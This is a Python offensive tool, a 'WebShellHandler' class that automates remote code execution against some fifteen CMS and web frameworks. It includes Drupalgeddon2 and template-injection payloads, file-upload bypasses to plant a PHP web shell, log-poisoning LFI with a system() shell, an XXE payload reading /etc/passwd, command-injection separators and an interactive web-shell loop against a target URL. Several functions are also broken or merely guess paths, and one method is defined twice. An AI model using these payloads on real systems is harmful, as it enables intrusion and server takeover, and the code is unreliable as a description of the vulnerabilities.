"""
Web Shell Handler - 15+ CMS Platforms RCE Automation
Advanced exploitation with upload bypass & magic byte spoofing
"""

import requests
import re
import json
import base64
import mimetypes
from typing import Dict, Optional, List, Tuple
from urllib.parse import urljoin, quote, parse_qs, urlparse
try:
    from bs4 import BeautifulSoup
except Exception:
    BeautifulSoup = None


class WebShellHandler:
    """Enterprise-grade Web RCE for 15+ CMS platforms"""
    
    # CMS Detection Patterns
    CMS_PATTERNS = {
        'drupal': [r'drupal', r'/sites/default/', r'Drupal\s*8|9|10'],
        'wordpress': [r'wp-content', r'wordpress', r'wp-login.php'],
        'joomla': [r'joomla', r'/images/joomla', r'mod_menu'],
        'magento': [r'magento', r'/media/catalog/', r'Mage_'],
        'django': [r'django', r'csrftoken', r'/admin/'],
        'flask': [r'flask', r'jinja2', r'werkzeug'],
        'laravel': [r'laravel', r'/storage/', r'X-CSRF-TOKEN'],
        'rails': [r'rails', r'app/assets', r'authenticity_token'],
        'symfony': [r'symfony', r'/bundles/', r'_token'],
        'typo3': [r'typo3', r't3skin', r'/typo3/'],
        'opencart': [r'opencart', r'/?route=', r'system/storage/'],
        'prestashop': [r'prestashop', r'/modules/', r'PrestaShop'],
        'ghost': [r'ghost', r'content/themes', r'#gh'],
        'strapi': [r'strapi', r'/content-manager', r'graphql'],
        'webflow': [r'webflow', r'webflow.js', r'webflow.css'],
    }
    
    def __init__(self, base_url: str, timeout: int = 10):
        self.base_url = base_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.shell_url = None
        self.authenticated = False
        self.cms_type = None
        self.uploads_path = None
    
    def detect_cms(self) -> Optional[str]:
        """Auto-detect CMS from HTTP responses"""
        try:
            response = self.session.get(self.base_url, timeout=self.timeout)
            content = response.text.lower()
            headers = str(response.headers).lower()
            
            for cms, patterns in self.CMS_PATTERNS.items():
                for pattern in patterns:
                    if re.search(pattern, content + headers, re.IGNORECASE):
                        self.cms_type = cms
                        return cms
        except:
            pass
        return None
    
    # ==================== DRUPAL (CVE-2018-7600 & CVE-2018-7602) ====================
    
    def drupal_rce(self, command: str) -> Optional[str]:
        """Drupal Drupalgeddon2 RCE"""
        try:
            endpoint = urljoin(self.base_url, "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax")
            payload = {
                "form_id": "user_register_form",
                "account[mail][#post_render][]": "exec",
                "account[mail][#type]": "markup",
                "account[mail][#markup]": command
            }
            response = self.session.post(endpoint, json=payload, timeout=self.timeout)
            return response.text if response.status_code == 200 else None
        except Exception as e:
            return f"❌ Error: {str(e)}"
    
    # ==================== WORDPRESS (RCE via Plugins/Themes) ====================
    
    def wordpress_rce(self, command: str, plugin_slug: str = "hello-dolly") -> Optional[str]:
        """WordPress Plugin/Theme RCE exploitation"""
        attempts = [
            f"/wp-content/plugins/{plugin_slug}/vulnerable.php",
            f"/wp-content/themes/vulnerable/theme.php",
            f"/wp-admin/admin-ajax.php?action=wpml_show_po_files&get_strings=1",
        ]
        
        for path in attempts:
            try:
                url = urljoin(self.base_url, path)
                response = self.session.get(url, params={"cmd": command}, timeout=self.timeout)
                if response.status_code == 200:
                    return response.text
            except:
                continue
        
        return None
    
    # ==================== JOOMLA (RCE via Components) ====================
    
    def joomla_rce(self, command: str) -> Optional[str]:
        """Joomla Component RCE exploitation"""
        try:
            # Try CVE-2023-23752 (com_system)
            endpoint = urljoin(self.base_url, "/index.php?option=com_system&cmd={}&raw=1")
            response = self.session.get(endpoint.format(quote(command)), timeout=self.timeout)
            
            if response.status_code == 200:
                return response.text
            
            # Try alternative endpoints
            alt_endpoints = [
                "/index.php?option=com_media&view=images&tmpl=component",
                "/administrator/index.php?option=com_config",
            ]
            
            for ep in alt_endpoints:
                response = self.session.get(urljoin(self.base_url, ep), timeout=self.timeout)
                if response.status_code == 200:
                    return response.text
        except Exception as e:
            return f"❌ Error: {str(e)}"
        
        return None
    
    # ==================== MAGENTO (Template Injection & Admin Upload) ====================
    
    def magento_rce(self, command: str) -> Optional[str]:
        """Magento Template Injection RCE"""
        try:
            # Magento template injection vector
            payload = "{{{{php:echo shell_exec('" + command + "');}}}}"
            
            endpoints = [
                "/admin/system_config/edit/section/design/",
                "/index.php/admin_1/system_config/edit/section/design/",
            ]
            
            for ep in endpoints:
                url = urljoin(self.base_url, ep)
                data = {"design[footer][absolute_footer]": payload}
                response = self.session.post(url, data=data, timeout=self.timeout)
                if response.status_code == 200:
                    return response.text
        except Exception as e:
            return f"❌ Error: {str(e)}"
        
        return None
    
    # ==================== DJANGO (Debug Mode RCE & Template Injection) ====================
    
    def django_rce(self, command: str) -> Optional[str]:
        """Django Debug Mode RCE"""
        try:
            # Check for Django debug mode
            response = self.session.get(urljoin(self.base_url, "/invalid-path/"), timeout=self.timeout)
            
            if "Django" in response.text and "Error" in response.text:
                # Debug mode is likely on - try template injection
                template_payload = f"{{{{ {command}|safe }}}}"
                endpoints = [
                    "/api/search/",
                    "/search/",
                    "/filter/",
                ]
                
                for ep in endpoints:
                    params = {"q": template_payload}
                    response = self.session.get(urljoin(self.base_url, ep), params=params, timeout=self.timeout)
                    if response.status_code == 200:
                        return response.text
        except Exception as e:
            return f"❌ Error: {str(e)}"
        
        return None
    
    # ==================== FLASK (Jinja2 Template Injection) ====================
    
    def flask_rce(self, command: str) -> Optional[str]:
        """Flask/Jinja2 Template Injection RCE"""
        try:
            # Jinja2 SSTI payload
            payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('" + command + "').read() }}"
            
            endpoints = [
                "/search",
                "/filter",
                "/api",
                "/render",
            ]
            
            for ep in endpoints:
                params = {"search": payload, "render": payload, "filter": payload}
                response = self.session.get(urljoin(self.base_url, ep), params=params, timeout=self.timeout)
                if response.status_code == 200 and len(response.text) > 10:
                    return response.text
        except Exception as e:
            return f"❌ Error: {str(e)}"
        
        return None
    
    # ==================== LARAVEL (Blade Template Injection & Queue Exploitation) ====================
    
    def laravel_rce(self, command: str) -> Optional[str]:
        """Laravel RCE via Template Injection"""
        try:
            # Blade template injection
            payload = "{{ system('" + command + "') }}"
            
            endpoints = [
                "/api/search",
                "/search",
                "/filter",
                "/mail/preview",
            ]
            
            for ep in endpoints:
                response = self.session.get(urljoin(self.base_url, ep), params={"query": payload}, timeout=self.timeout)
                if response.status_code == 200:
                    return response.text
        except Exception as e:
            return f"❌ Error: {str(e)}"
        
        return None
    
    # ==================== RAILS (ERB Template Injection) ====================
    
    def rails_rce(self, command: str) -> Optional[str]:
        """Rails ERB Template Injection RCE"""
        try:
            payload = "<%= `" + command + "` %>"
            
            endpoints = [
                "/search",
                "/filter",
                "/api",
            ]
            
            for ep in endpoints:
                response = self.session.get(urljoin(self.base_url, ep), params={"q": payload}, timeout=self.timeout)
                if response.status_code == 200:
                    return response.text
        except Exception as e:
            return f"❌ Error: {str(e)}"
        
        return None
    
    # ==================== SYMFONY (Twig Template Injection) ====================
    
    def symfony_rce(self, command: str) -> Optional[str]:
        """Symfony Twig Template Injection RCE"""
        try:
            payload = "{{ system('" + command + "') }}"
            
            endpoints = [
                "/_profiler/",
                "/api/",
                "/search/",
            ]
            
            for ep in endpoints:
                response = self.session.get(urljoin(self.base_url, ep), params={"query": payload}, timeout=self.timeout)
                if response.status_code == 200:
                    return response.text
        except Exception as e:
            return f"❌ Error: {str(e)}"
        
        return None
    
    # ==================== TYPO3 (RCE via Extensions) ====================
    
    def typo3_rce(self, command: str) -> Optional[str]:
        """TYPO3 RCE exploitation"""
        try:
            # TYPO3 extension exploitation
            endpoints = [
                "/typo3/sysext/",
                "/typo3conf/ext/",
                "/index.php?eID=",
            ]
            
            for ep in endpoints:
                response = self.session.get(urljoin(self.base_url, ep), params={"cmd": command}, timeout=self.timeout)
                if response.status_code == 200:
                    return response.text
        except Exception as e:
            return f"❌ Error: {str(e)}"
        
        return None
    
    # ==================== OPENCART (RCE via Admin/Upload) ====================
    
    def opencart_rce(self, command: str) -> Optional[str]:
        """OpenCart RCE exploitation"""
        try:
            endpoints = [
                "/admin/controller/module/",
                "/upload/",
                "/system/storage/upload/",
            ]
            
            for ep in endpoints:
                response = self.session.post(urljoin(self.base_url, ep), data={"cmd": command}, timeout=self.timeout)
                if response.status_code == 200:
                    return response.text
        except Exception as e:
            return f"❌ Error: {str(e)}"
        
        return None
    
    # ==================== GENERIC UPLOAD BYPASS ====================
    
    def upload_with_bypass(self, shell_code: str, filename: str = "shell.php") -> Tuple[bool, str]:
        """Upload file with multiple bypass techniques"""
        
        techniques = [
            self._upload_null_byte(shell_code, filename),
            self._upload_double_extension(shell_code, filename),
            self._upload_magic_bytes(shell_code, filename),
            self._upload_htaccess_trick(shell_code, filename),
            self._upload_case_variation(shell_code, filename),
        ]
        
        for success, url in techniques:
            if success:
                self.shell_url = url
                return (True, url)
        
        return (False, "All upload techniques failed")
    
    def _upload_null_byte(self, shell_code: str, filename: str) -> Tuple[bool, str]:
        """Null byte injection bypass"""
        try:
            modified_name = filename.replace('.php', '.php%00.jpg')
            files = {"file": (modified_name, shell_code)}
            response = self.session.post(urljoin(self.base_url, "/upload/"), files=files, timeout=self.timeout)
            if response.status_code in [200, 201]:
                return (True, urljoin(self.base_url, f"/uploads/{filename}"))
        except:
            pass
        return (False, "")
    
    def _upload_double_extension(self, shell_code: str, filename: str) -> Tuple[bool, str]:
        """Double extension bypass"""
        try:
            modified_name = filename.replace('.php', '.php.jpg')
            files = {"file": (modified_name, shell_code)}
            response = self.session.post(urljoin(self.base_url, "/upload/"), files=files, timeout=self.timeout)
            if response.status_code in [200, 201]:
                return (True, urljoin(self.base_url, f"/uploads/{modified_name}"))
        except:
            pass
        return (False, "")
    
    def _upload_magic_bytes(self, shell_code: str, filename: str) -> Tuple[bool, str]:
        """Magic bytes spoofing (JPG/PNG/GIF)"""
        try:
            # Add JPG magic bytes
            jpg_header = bytes.fromhex("FFD8FFE0")
            payload = jpg_header + shell_code.encode()
            
            modified_name = filename.replace('.php', '.jpg.php')
            files = {"file": (modified_name, payload)}
            response = self.session.post(urljoin(self.base_url, "/upload/"), files=files, timeout=self.timeout)
            if response.status_code in [200, 201]:
                return (True, urljoin(self.base_url, f"/uploads/{modified_name}"))
        except:
            pass
        return (False, "")
    
    def _upload_htaccess_trick(self, shell_code: str, filename: str) -> Tuple[bool, str]:
        """Upload .htaccess to treat files as PHP"""
        try:
            htaccess_content = "AddType application/x-httpd-php .jpg"
            
            files = {"file": (".htaccess", htaccess_content)}
            response = self.session.post(urljoin(self.base_url, "/upload/"), files=files, timeout=self.timeout)
            
            if response.status_code in [200, 201]:
                # Now upload shell as JPG
                jpg_name = filename.replace('.php', '.jpg')
                files = {"file": (jpg_name, shell_code)}
                response = self.session.post(urljoin(self.base_url, "/upload/"), files=files, timeout=self.timeout)
                
                if response.status_code in [200, 201]:
                    return (True, urljoin(self.base_url, f"/uploads/{jpg_name}"))
        except:
            pass
        return (False, "")
    
    def _upload_case_variation(self, shell_code: str, filename: str) -> Tuple[bool, str]:
        """Case variation bypass (.pHp, .pHP, etc)"""
        try:
            variations = ['.pHp', '.PHP', '.PhP', '.pHP', '.phP']
            
            for ext in variations:
                modified_name = filename.replace('.php', ext)
                files = {"file": (modified_name, shell_code)}
                response = self.session.post(urljoin(self.base_url, "/upload/"), files=files, timeout=self.timeout)
                
                if response.status_code in [200, 201]:
                    return (True, urljoin(self.base_url, f"/uploads/{modified_name}"))
        except:
            pass
        return (False, "")
    
    # ==================== GENERIC WEB SHELL EXECUTION ====================
    
    def execute_via_shell(self, command: str) -> Optional[str]:
        """Execute command via uploaded web shell"""
        if not self.shell_url:
            return None
        
        try:
            params = {"cmd": command}
            response = self.session.get(self.shell_url, params=params, timeout=self.timeout)
            
            if response.status_code == 200:
                return response.text
            return None
        except Exception as e:
            return f"❌ Shell execution failed: {str(e)}"
    
    # ==================== SQL INJECTION COMMAND EXECUTION ====================
    
    def sqli_command_execution(self, query: str, vulnerable_param: str = "id") -> Optional[str]:
        """Execute OS commands through SQL injection"""
        try:
            # INTO OUTFILE technique (MySQL)
            payload = f"1' UNION SELECT 1,2,3,4,5 INTO OUTFILE '/var/www/shell.php' -- -"
            
            params = {vulnerable_param: payload}
            response = self.session.get(urljoin(self.base_url, "/index.php"), params=params, timeout=self.timeout)
            
            if "database error" not in response.text.lower():
                return "✅ SQLi injection successful"
            return None
        except Exception as e:
            return f"❌ SQLi execution failed: {str(e)}"
    
    # ==================== LFI TO RCE ====================
    
    def lfi_to_rce(self, lfi_param: str = "page", log_file: str = "/var/log/apache2/access.log") -> Optional[str]:
        """LFI → RCE via log poisoning"""
        try:
            # Step 1: Poison log file with PHP code
            php_payload = "<?php system($_GET['cmd']); ?>"
            headers = {"User-Agent": php_payload}
            
            response = self.session.get(urljoin(self.base_url, "/"), headers=headers, timeout=self.timeout)
            
            # Step 2: Include poisoned log file via LFI
            payload = f"..%2F..%2F{log_file}%00"
            params = {lfi_param: payload}
            
            response = self.session.get(urljoin(self.base_url, "/index.php"), params=params, timeout=self.timeout)
            
            if response.status_code == 200:
                return "✅ LFI to RCE successful"
            return None
        except Exception as e:
            return f"❌ LFI to RCE failed: {str(e)}"
    
    # ==================== XXE RCE ====================
    
    def xxe_rce(self, xml_param: str = "data") -> Optional[str]:
        """XXE (XML External Entity) RCE"""
        try:
            xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>"""
            
            params = {xml_param: xxe_payload}
            response = self.session.post(urljoin(self.base_url, "/api/parse"), json=params, timeout=self.timeout)
            
            if response.status_code == 200 and "root:" in response.text:
                return response.text
            return None
        except Exception as e:
            return f"❌ XXE failed: {str(e)}"
    
    # ==================== COMMAND INJECTION ====================
    
    def command_injection(self, vulnerable_param: str = "input", injected_cmd: str = "whoami") -> Optional[str]:
        """Direct command injection via parameter"""
        try:
            # Try various separators
            separators = [";", "|", "||", "&", "&&", "`", "$()"]
            
            for sep in separators:
                payload = f"dummy{sep}{injected_cmd}"
                params = {vulnerable_param: payload}
                
                response = self.session.get(urljoin(self.base_url, "/index.php"), params=params, timeout=self.timeout)
                
                if response.status_code == 200 and len(response.text) > 100:
                    return response.text
            
            return None
        except Exception as e:
            return f"❌ Command injection failed: {str(e)}"
    
    # ==================== INTERACTIVE SHELL ====================
    
    def interactive_shell(self) -> None:
        """Interactive shell loop via web"""
        if not self.shell_url:
            print("❌ No shell URL set")
            return
        
        print(f"\n🔓 Interactive Web Shell: {self.shell_url}")
        print("Type 'exit' to quit\n")
        
        while True:
            try:
                cmd = input("web_shell> ")
                if cmd.lower() == "exit":
                    break
                
                result = self.execute_via_shell(cmd)
                if result:
                    print(result)
                else:
                    print("❌ Command failed")
            except KeyboardInterrupt:
                print("\n🚪 Shell closed")
                break
            except Exception as e:
                print(f"❌ Error: {e}")
    
    # ==================== DETECTION & ENUMERATION ====================
    
    def detect_cms(self) -> Optional[str]:
        """Detect CMS type"""
        try:
            response = self.session.get(self.base_url, timeout=self.timeout)
            
            if "wp-content" in response.text or "wp-includes" in response.text:
                return "WordPress"
            elif "drupal" in response.text.lower() or "sites/default" in response.text:
                return "Drupal"
            elif "joomla" in response.text.lower():
                return "Joomla"
            
            return None
        except Exception as e:
            return None
    
    def check_rce_vulnerability(self) -> Dict[str, bool]:
        """Check for common RCE vulnerabilities"""
        results = {
            "drupal_rce": False,
            "wordpress_rce": False,
            "command_injection": False,
            "xxe": False
        }
        
        cms = self.detect_cms()
        
        if cms == "Drupal":
            result = self.drupal_rce("whoami")
            results["drupal_rce"] = result is not None and "❌" not in result
        
        if cms == "WordPress":
            result = self.wordpress_rce("whoami")
            results["wordpress_rce"] = result is not None and "❌" not in result
        
        result = self.command_injection()
        results["command_injection"] = result is not None and "❌" not in result
        
        result = self.xxe_rce()
        results["xxe"] = result is not None and "❌" not in result
        
        return results


# ==================== EXAMPLE USAGE ====================

if __name__ == "__main__":
    handler = WebShellHandler("http://target.com")
    
    # Detect CMS
    cms = handler.detect_cms()
    print(f"Detected CMS: {cms}")
    
    # Check vulnerabilities
    vulns = handler.check_rce_vulnerability()
    for vuln, status in vulns.items():
        print(f"  {vuln}: {'✅' if status else '❌'}")
    
    # Execute command
    result = handler.drupal_rce("id")
    if result:
        print(f"\nCommand output:\n{result}")
